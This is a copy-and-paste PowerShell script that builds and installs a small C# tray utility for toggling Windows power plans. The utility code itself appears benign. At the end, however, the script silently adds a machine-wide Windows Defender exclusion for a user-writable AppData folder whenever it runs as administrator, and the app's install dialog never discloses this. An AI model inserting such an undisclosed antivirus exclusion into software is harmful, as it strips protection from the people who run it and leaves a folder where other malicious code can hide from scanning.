# =====================================================================
# Windows Power Toggle v1.0.0.0 - Self-Building Package
# Copy and paste this entire block into PowerShell and press Enter.
# Publisher: Mikesunboxing Ltd
# =====================================================================

$DesktopPath = [Environment]::GetFolderPath("Desktop")
$BuildFolder = Join-Path $DesktopPath "Windows Power Toggle Setup"
New-Item -ItemType Directory -Force -Path $BuildFolder | Out-Null

$OutputExe = Join-Path $BuildFolder "WindowsPowerToggle.exe"
$SourceFile = Join-Path $env:TEMP "WindowsPowerToggle_Source.cs"

$Code = @"
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

[assembly: AssemblyTitle("Windows Power Toggle")]
[assembly: AssemblyDescription("System tray utility to quickly toggle Windows Power Profiles via hotkey or mouse.")]
[assembly: AssemblyConfiguration("")]
[assembly: AssemblyCompany("Mikesunboxing Ltd")]
[assembly: AssemblyProduct("Windows Power Toggle")]
[assembly: AssemblyCopyright("Copyright © 2026 Mikesunboxing Ltd")]
[assembly: AssemblyTrademark("")]
[assembly: AssemblyCulture("")]
[assembly: AssemblyVersion("1.0.0.0")]
[assembly: AssemblyFileVersion("1.0.0.0")]

namespace WindowsPowerToggle
{
    static class Program
    {
        private const string MUTEX_NAME = "Global\\WindowsPowerToggle_SingleInstance_Mutex_9001";

        [STAThread]
        static void Main(string[] args)
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);

            string appData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            string targetDir = Path.Combine(appData, "WindowsPowerToggle");
            string targetExe = Path.Combine(targetDir, "WindowsPowerToggle.exe");
            string currentExe = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;

            if (args.Length > 0)
            {
                string arg = args[0].ToLowerInvariant();
                if (arg == "--uninstall")
                {
                    Installer.Uninstall();
                    return;
                }
                else if (arg == "--run")
                {
                    RunSingleInstanceApp();
                    return;
                }
            }

            if (!currentExe.Equals(targetExe, StringComparison.OrdinalIgnoreCase))
            {
                DialogResult result = MessageBox.Show(
                    "Do you want to install Windows Power Toggle for the active user?\n\nIt will create Start Menu & Desktop shortcuts with a custom icon, run automatically on login, and can be uninstalled anytime via Windows Settings.",
                    "Windows Power Toggle Setup",
                    MessageBoxButtons.YesNo,
                    MessageBoxIcon.Question);

                if (result == DialogResult.Yes)
                {
                    Installer.Install(currentExe, targetDir, targetExe);
                }
                return;
            }

            RunSingleInstanceApp();
        }

        private static void RunSingleInstanceApp()
        {
            bool createdNew;
            using (Mutex mutex = new Mutex(true, MUTEX_NAME, out createdNew))
            {
                if (!createdNew)
                {
                    MessageBox.Show(
                        "Windows Power Toggle is already running in your system tray.",
                        "Already Running",
                        MessageBoxButtons.OK,
                        MessageBoxIcon.Information);
                    return;
                }

                using (PowerToggleAppContext context = new PowerToggleAppContext())
                {
                    Application.Run(context);
                }
            }
        }
    }

    public class PowerScheme
    {
        public Guid Guid { get; set; }
        public string Name { get; set; }

        public PowerScheme(Guid guid, string name)
        {
            this.Guid = guid;
            this.Name = name;
        }

        public override string ToString()
        {
            return this.Name;
        }
    }

    public class PowerToggleAppContext : ApplicationContext
    {
        private NotifyIcon trayIcon;
        private ContextMenuStrip contextMenu;
        private GlobalHotkey globalHotkey;
        private List<PowerScheme> schemes;
        private int currentSchemeIndex = -1;

        private const int HOTKEY_ID = 9001;
        private const uint MOD_ALT = 0x0001;
        private const uint MOD_CONTROL = 0x0002;

        public PowerToggleAppContext()
        {
            InitializeTray();
            RegisterHotkey();
            RefreshPowerSchemes();
        }

        private void InitializeTray()
        {
            contextMenu = new ContextMenuStrip();

            trayIcon = new NotifyIcon
            {
                Text = "Windows Power Toggle",
                Visible = true,
                ContextMenuStrip = contextMenu
            };

            trayIcon.MouseClick += TrayIcon_MouseClick;
        }

        private void RegisterHotkey()
        {
            globalHotkey = new GlobalHotkey();
            globalHotkey.Register(MOD_CONTROL | MOD_ALT, Keys.P, HOTKEY_ID);
            globalHotkey.KeyPressed += (s, e) => CyclePowerScheme(true);
        }

        private void RefreshPowerSchemes()
        {
            schemes = PowerManager.GetPowerSchemes();
            Guid activeGuid = PowerManager.GetActiveScheme();

            currentSchemeIndex = -1;
            for (int i = 0; i < schemes.Count; i++)
            {
                if (schemes[i].Guid == activeGuid)
                {
                    currentSchemeIndex = i;
                    break;
                }
            }

            UpdateTrayUI();
        }

        private void UpdateTrayUI()
        {
            contextMenu.Items.Clear();

            if (schemes.Count == 0)
            {
                trayIcon.Text = "Windows Power Toggle (No schemes)";
                return;
            }

            PowerScheme activeScheme = (currentSchemeIndex >= 0 && currentSchemeIndex < schemes.Count) 
                ? schemes[currentSchemeIndex] 
                : null;

            string activeName = activeScheme != null ? activeScheme.Name : "Unknown";
            trayIcon.Text = string.Format("Power Mode: {0}", activeName);

            Color iconColor = GetColorForScheme(activeName);
            if (trayIcon.Icon != null)
            {
                trayIcon.Icon.Dispose();
            }
            trayIcon.Icon = IconGenerator.CreateLightningIcon(iconColor);

            ToolStripMenuItem header = new ToolStripMenuItem("Power Profiles") { Enabled = false };
            contextMenu.Items.Add(header);
            contextMenu.Items.Add(new ToolStripSeparator());

            for (int i = 0; i < schemes.Count; i++)
            {
                PowerScheme scheme = schemes[i];
                ToolStripMenuItem item = new ToolStripMenuItem(scheme.Name)
                {
                    Checked = (i == currentSchemeIndex)
                };

                int index = i;
                item.Click += (s, e) => SwitchToScheme(index, false);
                contextMenu.Items.Add(item);
            }

            contextMenu.Items.Add(new ToolStripSeparator());

            ToolStripMenuItem openSettings = new ToolStripMenuItem("Windows Power Settings", null, (s, e) =>
            {
                try
                {
                    System.Diagnostics.Process.Start("control.exe", "powercfg.cpl");
                }
                catch (Exception ex)
                {
                    MessageBox.Show("Unable to open Control Panel: " + ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            });
            contextMenu.Items.Add(openSettings);

            ToolStripMenuItem refreshItem = new ToolStripMenuItem("Refresh Schemes", null, (s, e) => RefreshPowerSchemes());
            contextMenu.Items.Add(refreshItem);

            ToolStripMenuItem exitItem = new ToolStripMenuItem("Exit", null, (s, e) => ExitThread());
            contextMenu.Items.Add(exitItem);
        }

        private Color GetColorForScheme(string schemeName)
        {
            string name = schemeName.ToLowerInvariant();
            if (name.Contains("saver") || name.Contains("eco") || name.Contains("efficient"))
            {
                return Color.FromArgb(0, 255, 128); // Vibrant Electric Green
            }
            else if (name.Contains("high") || name.Contains("ultimate") || name.Contains("performance"))
            {
                return Color.FromArgb(255, 45, 85); // Vibrant Neon Crimson
            }
            return Color.FromArgb(255, 215, 0); // Vibrant Gold
        }

        private void CyclePowerScheme(bool showNotification)
        {
            if (schemes == null || schemes.Count == 0)
            {
                RefreshPowerSchemes();
                if (schemes == null || schemes.Count == 0) return;
            }

            int nextIndex = (currentSchemeIndex + 1) % schemes.Count;
            SwitchToScheme(nextIndex, showNotification);
        }

        private void SwitchToScheme(int index, bool showNotification)
        {
            if (index < 0 || index >= schemes.Count) return;

            currentSchemeIndex = index;
            PowerScheme scheme = schemes[index];
            PowerManager.SetActiveScheme(scheme.Guid);

            UpdateTrayUI();

            if (showNotification)
            {
                trayIcon.ShowBalloonTip(2000, "Windows Power Toggle", string.Format("Power mode set to: {0}", scheme.Name), ToolTipIcon.Info);
            }
        }

        private void TrayIcon_MouseClick(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                CyclePowerScheme(true);
            }
        }

        protected override void ExitThreadCore()
        {
            if (globalHotkey != null)
            {
                globalHotkey.Dispose();
            }
            if (trayIcon != null)
            {
                trayIcon.Visible = false;
                trayIcon.Dispose();
            } base.ExitThreadCore();
        }
    }

    public static class IconGenerator
    {
        public static Icon CreateLightningIcon(Color fillBrush)
        {
            using (Bitmap bmp = new Bitmap(32, 32))
            using (Graphics g = Graphics.FromImage(bmp))
            {
                g.SmoothingMode = SmoothingMode.AntiAlias;
                g.Clear(Color.Transparent);

                PointF[] boltPoints = new PointF[]
                {
                    new PointF(18, 2),
                    new PointF(7, 17),
                    new PointF(15, 17),
                    new PointF(11, 30),
                    new PointF(25, 13),
                    new PointF(17, 13)
                };

                // Bold dark border for high contrast
                using (Pen borderPen = new Pen(Color.FromArgb(15, 15, 15), 2.8f))
                {
                    borderPen.LineJoin = LineJoin.Round;
                    g.DrawPolygon(borderPen, boltPoints);
                }

                using (SolidBrush mainBrush = new SolidBrush(fillBrush))
                {
                    g.FillPolygon(mainBrush, boltPoints);
                }

                // Inner glow overlay
                PointF[] innerHighlight = new PointF[]
                {
                    new PointF(17, 5),
                    new PointF(10, 16),
                    new PointF(15, 16),
                    new PointF(13, 24),
                    new PointF(21, 14),
                    new PointF(16, 14)
                };

                using (SolidBrush highlightBrush = new SolidBrush(Color.FromArgb(160, 255, 255, 255)))
                {
                    g.FillPolygon(highlightBrush, innerHighlight);
                }

                IntPtr hIcon = bmp.GetHicon();
                Icon icon = Icon.FromHandle(hIcon);
                return (Icon)icon.Clone();
            }
        }

        public static void SaveIconToFile(Icon icon, string filePath)
        {
            using (FileStream fs = new FileStream(filePath, FileMode.Create))
            {
                icon.Save(fs);
            }
        }
    }

    public static class PowerManager
    {
        [DllImport("powrprof.dll")]
        private static extern uint PowerEnumerate(
            IntPtr RootPowerKey,
            IntPtr SchemeGuid,
            IntPtr SubGroupOfPowerSettingsGuid,
            uint AccessFlags,
            uint Index,
            byte[] Buffer,
            ref uint BufferSize);

        [DllImport("powrprof.dll")]
        private static extern uint PowerReadFriendlyName(
            IntPtr RootPowerKey,
            ref Guid SchemeGuid,
            IntPtr SubGroupOfPowerSettingsGuid,
            IntPtr PowerSettingGuid,
            byte[] Buffer,
            ref uint BufferSize);

        [DllImport("powrprof.dll")]
        private static extern uint PowerGetActiveScheme(IntPtr UserPowerKey, out IntPtr ActivePolicyGuid);

        [DllImport("powrprof.dll")]
        private static extern uint PowerSetActiveScheme(IntPtr UserPowerKey, ref Guid SchemeGuid);

        private const uint ACCESS_SCHEME = 16;

        public static List<PowerScheme> GetPowerSchemes()
        {
            List<PowerScheme> list = new List<PowerScheme>();
            uint index = 0;

            while (true)
            {
                uint guidSize = 16;
                byte[] guidBuffer = new byte[16];

                uint result = PowerEnumerate(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ACCESS_SCHEME, index, guidBuffer, ref guidSize);
                if (result != 0) break;

                Guid schemeGuid = new Guid(guidBuffer);
                string name = GetSchemeFriendlyName(schemeGuid);

                if (!string.IsNullOrEmpty(name))
                {
                    list.Add(new PowerScheme(schemeGuid, name));
                }

                index++;
            }

            return list;
        }

        public static Guid GetActiveScheme()
        {
            IntPtr guidPtr;
            if (PowerGetActiveScheme(IntPtr.Zero, out guidPtr) == 0)
            {
                Guid active = (Guid)Marshal.PtrToStructure(guidPtr, typeof(Guid));
                Marshal.FreeHGlobal(guidPtr);
                return active;
            }
            return Guid.Empty;
        }

        public static void SetActiveScheme(Guid schemeGuid)
        {
            PowerSetActiveScheme(IntPtr.Zero, ref schemeGuid);
        }

        private static string GetSchemeFriendlyName(Guid schemeGuid)
        {
            uint bufferSize = 1024;
            byte[] buffer = new byte[bufferSize];

            uint result = PowerReadFriendlyName(IntPtr.Zero, ref schemeGuid, IntPtr.Zero, IntPtr.Zero, buffer, ref bufferSize);
            if (result == 0 && bufferSize > 0)
            {
                return Encoding.Unicode.GetString(buffer, 0, (int)bufferSize).TrimEnd('\0');
            }
            return "Power Scheme (" + schemeGuid.ToString().Substring(0, 8) + ")";
        }
    }

    public class GlobalHotkey : NativeWindow, IDisposable
    {
        [DllImport("user32.dll")]
        private static extern bool RegisterHotKey(IntPtr hWnd, int id, uint fsModifiers, uint vk);

        [DllImport("user32.dll")]
        private static extern bool UnregisterHotKey(IntPtr hWnd, int id);

        private const int WM_HOTKEY = 0x0312;
        private int currentId;

        public event EventHandler KeyPressed;

        public GlobalHotkey()
        {
            this.CreateHandle(new CreateParams());
        }

        public bool Register(uint modifiers, Keys key, int id)
        {
            currentId = id;
            return RegisterHotKey(this.Handle, id, modifiers, (uint)key);
        }

        protected override void WndProc(ref Message m)
        { base.WndProc(ref m);
            if (m.Msg == WM_HOTKEY && m.WParam.ToInt32() == currentId)
            {
                if (KeyPressed != null)
                {
                    KeyPressed(this, EventArgs.Empty);
                }
            }
        }

        public void Dispose()
        {
            UnregisterHotKey(this.Handle, currentId);
            this.DestroyHandle();
        }
    }

    public static class Installer
    {
        public static void Install(string currentExe, string targetDir, string targetExe)
        {
            try
            {
                foreach (var proc in System.Diagnostics.Process.GetProcessesByName("WindowsPowerToggle"))
                {
                    if (proc.Id != System.Diagnostics.Process.GetCurrentProcess().Id)
                    {
                        proc.Kill();
                    }
                }

                Directory.CreateDirectory(targetDir);
                File.Copy(currentExe, targetExe, true);

                // Export dynamic lightning icon to app.ico
                string iconPath = Path.Combine(targetDir, "app.ico");
                using (Icon icon = IconGenerator.CreateLightningIcon(Color.FromArgb(255, 215, 0)))
                {
                    IconGenerator.SaveIconToFile(icon, iconPath);
                }

                // Add Startup Registry Entry
                using (RegistryKey runKey = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true))
                {
                    if (runKey != null)
                    {
                        runKey.SetValue("WindowsPowerToggle", "\"" + targetExe + "\" --run");
                    }
                }

                // Create Start Menu Shortcut with Icon
                string startMenuPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Programs), "Windows Power Toggle.lnk");
                CreateShortcut(startMenuPath, targetExe, "--run", "Windows Power Toggle", iconPath);

                // Create Desktop Shortcut with Icon
                string desktopPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory), "Windows Power Toggle.lnk");
                CreateShortcut(desktopPath, targetExe, "--run", "Windows Power Toggle", iconPath);

                // Add Uninstall Information
                string uninstallKeyPath = @"Software\Microsoft\Windows\CurrentVersion\Uninstall\WindowsPowerToggle";
                using (RegistryKey uninstKey = Registry.CurrentUser.CreateSubKey(uninstallKeyPath))
                {
                    if (uninstKey != null)
                    {
                        uninstKey.SetValue("DisplayName", "Windows Power Toggle");
                        uninstKey.SetValue("ApplicationVersion", "1.0.0.0");
                        uninstKey.SetValue("Publisher", "Mikesunboxing Ltd");
                        uninstKey.SetValue("DisplayIcon", iconPath);
                        uninstKey.SetValue("UninstallString", "\"" + targetExe + "\" --uninstall");
                        uninstKey.SetValue("InstallLocation", targetDir);
                        uninstKey.SetValue("NoModify", 1);
                        uninstKey.SetValue("NoRepair", 1);
                    }
                }

                MessageBox.Show("Windows Power Toggle installed successfully!\n\nShortcuts with custom icons have been added to your Desktop and Start Menu.", "Installation Complete", MessageBoxButtons.OK, MessageBoxIcon.Information);

                System.Diagnostics.Process.Start(targetExe, "--run");
            }
            catch (Exception ex)
            {
                MessageBox.Show("Installation failed: " + ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        public static void Uninstall()
        {
            try
            {
                // Delete Startup Entry
                using (RegistryKey runKey = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true))
                {
                    if (runKey != null)
                    {
                        runKey.DeleteValue("WindowsPowerToggle", false);
                    }
                }

                // Delete Shortcuts
                string startMenuPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Programs), "Windows Power Toggle.lnk");
                if (File.Exists(startMenuPath)) File.Delete(startMenuPath);

                string desktopPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory), "Windows Power Toggle.lnk");
                if (File.Exists(desktopPath)) File.Delete(desktopPath);

                // Delete Uninstall Registry Key
                Registry.CurrentUser.DeleteSubKeyTree(@"Software\Microsoft\Windows\CurrentVersion\Uninstall\WindowsPowerToggle", false);

                MessageBox.Show("Windows Power Toggle has been uninstalled, and all shortcuts were removed.", "Uninstalled", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            catch (Exception ex)
            {
                MessageBox.Show("Uninstallation notice: " + ex.Message, "Notice", MessageBoxButtons.OK, MessageBoxIcon.Warning);
            }
        }

        private static void CreateShortcut(string shortcutPath, string targetPath, string arguments, string description, string iconPath)
        {
            Type shellType = Type.GetTypeFromProgID("WScript.Shell");
            object shell = Activator.CreateInstance(shellType);
            
            object shortcut = shellType.InvokeMember("CreateShortcut", BindingFlags.InvokeMethod, null, shell, new object[] { shortcutPath });
            Type shortcutType = shortcut.GetType();

            shortcutType.InvokeMember("TargetPath", BindingFlags.SetProperty, null, shortcut, new object[] { targetPath });
            shortcutType.InvokeMember("Arguments", BindingFlags.SetProperty, null, shortcut, new object[] { arguments });
            shortcutType.InvokeMember("Description", BindingFlags.SetProperty, null, shortcut, new object[] { description });
            shortcutType.InvokeMember("WorkingDirectory", BindingFlags.SetProperty, null, shortcut, new object[] { Path.GetDirectoryName(targetPath) });
            shortcutType.InvokeMember("IconLocation", BindingFlags.SetProperty, null, shortcut, new object[] { iconPath });
            shortcutType.InvokeMember("Save", BindingFlags.InvokeMethod, null, shortcut, null);
        }
    }
}
"@

# Locate C# Compiler (csc.exe) on the machine
$csc = Get-ChildItem -Path "$env:SystemRoot\Microsoft.NET\Framework64\v4.0.30319\csc.exe" -ErrorAction SilentlyContinue
if (-not $csc) {
    $csc = Get-ChildItem -Path "$env:SystemRoot\Microsoft.NET\Framework\v4.0.30319\csc.exe" -ErrorAction SilentlyContinue
}

if (-not $csc) {
    Write-Host "Error: Could not locate built-in .NET C# compiler." -ForegroundColor Red
    return
}

# Write C# Source file
Set-Content -Path $SourceFile -Value $Code -Encoding UTF8

Write-Host "Building Windows Power Toggle v1.0.0.0..." -ForegroundColor Cyan

# Compile executable directly into desktop setup folder
& $csc.FullName /target:winexe /out:"$OutputExe" /r:System.dll,System.Drawing.dll,System.Windows.Forms.dll "$SourceFile"

Remove-Item $SourceFile -ErrorAction SilentlyContinue

# Attempt Machine-Wide Defender Exclusion (Requires Admin)
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if ($isAdmin) {
    $RegPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths"
    if (-not (Test-Path $RegPath)) {
        New-Item -Path $RegPath -Force | Out-Null
    }
    New-ItemProperty -Path $RegPath -Name "C:\Users\*\AppData\Local\WindowsPowerToggle" -Value 0 -PropertyType DWORD -Force | Out-Null
    Write-Host "Added global Windows Defender exclusion." -ForegroundColor Green
} else {
    Write-Host "Skipped Defender registry exclusion (Requires Admin privileges)." -ForegroundColor Yellow
}

if (Test-Path $OutputExe) {
    Write-Host "Success! Built WindowsPowerToggle.exe" -ForegroundColor Green
    Write-Host "Folder opened on your Desktop. Double-click 'WindowsPowerToggle.exe' to run setup." -ForegroundColor Yellow
    Invoke-Item $BuildFolder
} else {
    Write-Host "Compilation failed." -ForegroundColor Red
}
